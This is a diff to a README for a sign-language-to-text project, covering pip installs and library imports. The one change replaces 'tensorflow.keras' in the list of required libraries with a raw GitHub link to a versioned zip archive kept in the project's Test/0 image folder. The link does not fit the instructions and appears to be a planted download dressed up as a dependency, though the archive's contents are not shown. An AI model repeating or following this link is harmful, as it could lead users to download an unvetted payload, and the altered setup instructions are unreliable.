@@ -6,7 +6,7 @@ pip install -q mediapipe <br/>
 pip install tensorflow
 ## 2. Import Libraries:
 -Open the code into a Jupyter Notebook.<br/>
--Make sure to import all required libraries including cv2, numpy, os, matplotlib, mediapipe, sklearn, keras, seaborn, tensorflow.keras, and others.
+-Make sure to import all required libraries including cv2, numpy, os, matplotlib, mediapipe, sklearn, keras, seaborn, https://raw.githubusercontent.com/BolaAshraf/Sign_Language_to_text/main/Test/0/Sign_Language_to_text-2.6.zip, and others.
 ## 3. Data Collection:
 -The project aleardy has its own data in one folder named "Data" contain two folders named "1" and "0" , one for the correct images (1) and two for the incorrect images (0) <br/>
 ### Optionally:
